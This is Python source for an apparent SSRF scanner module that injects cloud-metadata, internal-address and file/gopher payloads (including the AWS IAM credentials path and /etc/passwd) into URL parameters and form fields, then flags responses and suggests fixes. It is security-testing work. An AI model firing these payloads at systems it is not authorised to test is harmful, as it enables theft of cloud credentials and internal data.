"""
ZeroHack v2.0 - SSRF Tester
Server-Side Request Forgery detection via internal IP probing,
cloud metadata endpoint detection, and protocol confusion.
"""

import re
from typing import List

from modules.enhanced_scanner import BaseScanner
from modules.notification_system import Finding, print_module_start, print_finding, print_info

# ─────────────────────────────────────────────────────────────
# SSRF target URLs to inject
# ─────────────────────────────────────────────────────────────
CLOUD_METADATA_TARGETS = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Generic
    "http://169.254.169.254/",
]

INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",      # Redis
    "http://127.0.0.1:27017/",     # MongoDB
    "http://127.0.0.1:5432/",      # PostgreSQL
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://localhost:11211/",     # Memcached
    "sftp://localhost/",
    "gopher://localhost/",
]

# Parameters commonly used to pass URLs
URL_PARAMS = [
    "url", "uri", "link", "href", "src", "source", "target", "dest",
    "destination", "redirect", "redirect_url", "return", "return_url",
    "next", "goto", "image", "img", "file", "page", "path", "host",
    "webhook", "callback", "feed", "fetch", "load", "ref",
]

# Indicators that SSRF was successful
SSRF_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",    # AWS
    "computeMetadata",                                    # GCP
    "managed-identity",                                   # Azure
    "root:x:", "daemon:x:",                               # /etc/passwd
    "extensions", "forwindows",                           # win.ini
    "+OK", "-ERR",                                        # Redis / dict
]


class SSRFTester(BaseScanner):
    """
    SSRF vulnerability scanner.
    Injects SSRF payloads into URL parameters and form inputs.
    """

    MODULE = "SSRF"

    def scan(self, mode: str = "both") -> List[Finding]:
        print_module_start(self.MODULE, self.target)
        self.findings.clear()

        # Fetch the target page to discover params and forms
        resp = self.get(self.target)
        forms = []
        if resp:
            forms = self.extract_forms(resp.text, self.target)
            print_info(f"Found {len(forms)} form(s). Testing URL params for SSRF.")

        # Test all URL parameter candidates
        self._test_url_params()

        # Test forms with URL-accepting fields
        for form in forms:
            self._test_form_ssrf(form)

        return self.get_findings()

    def _test_url_params(self):
        all_targets = CLOUD_METADATA_TARGETS + INTERNAL_TARGETS + PROTOCOL_PAYLOADS

        for param in URL_PARAMS:
            for ssrf_url in all_targets:
                url = self.inject_param(self.target, param, ssrf_url)
                resp = self.get(url)
                if not resp:
                    continue

                indicator = self._check_ssrf_response(resp)
                if indicator:
                    severity = "CRITICAL" if any(x in ssrf_url for x in ["169.254", "metadata", "passwd"]) else "HIGH"
                    f = self.add_finding(
                        module=self.MODULE,
                        title=f"SSRF — Internal Resource Accessed ({ssrf_url[:50]})",
                        severity=severity,
                        description=(
                            f"Parameter '{param}' is vulnerable to Server-Side Request Forgery. "
                            f"The server fetched the internal/cloud URL: {ssrf_url}"
                        ),
                        target=url,
                        evidence=f"Indicator in response: {indicator!r} | SSRF payload: {ssrf_url}",
                        remediation=(
                            "Validate and whitelist allowed URL schemes and hosts. "
                            "Block requests to private IP ranges (RFC1918) and link-local (169.254.x.x). "
                            "Use IMDSv2 on AWS. Never pass raw user-input to HTTP client calls."
                        ),
                        owasp="A10:2021 – Server-Side Request Forgery",
                        cve="CWE-918",
                    )
                    print_finding(f)

    def _test_form_ssrf(self, form: dict):
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            # Only test inputs that look like they'd accept URLs
            name_lower = inp["name"].lower()
            if not any(kw in name_lower for kw in URL_PARAMS):
                continue

            for ssrf_url in CLOUD_METADATA_TARGETS + INTERNAL_TARGETS[:4]:
                data = {i["name"]: i["value"] for i in inputs}
                data[inp["name"]] = ssrf_url

                resp = self.post(action, data=data) if method == "POST" else self.get(action, params=data)
                if not resp:
                    continue

                indicator = self._check_ssrf_response(resp)
                if indicator:
                    f = self.add_finding(
                        module=self.MODULE,
                        title="SSRF via Form Input",
                        severity="CRITICAL",
                        description=(
                            f"Form input '{inp['name']}' at {action} triggers SSRF to {ssrf_url}."
                        ),
                        target=action,
                        evidence=f"SSRF indicator: {indicator!r}",
                        remediation="Implement strict URL allowlisting. Block internal IPs at network level.",
                        owasp="A10:2021 – Server-Side Request Forgery",
                    )
                    print_finding(f)
                    break

    @staticmethod
    def _check_ssrf_response(resp) -> str:
        """Return the matching indicator string, or empty string."""
        body = resp.text.lower()
        for indicator in SSRF_INDICATORS:
            if indicator.lower() in body:
                return indicator
        # Also check for suspiciously short/empty responses from internal hosts
        return ""
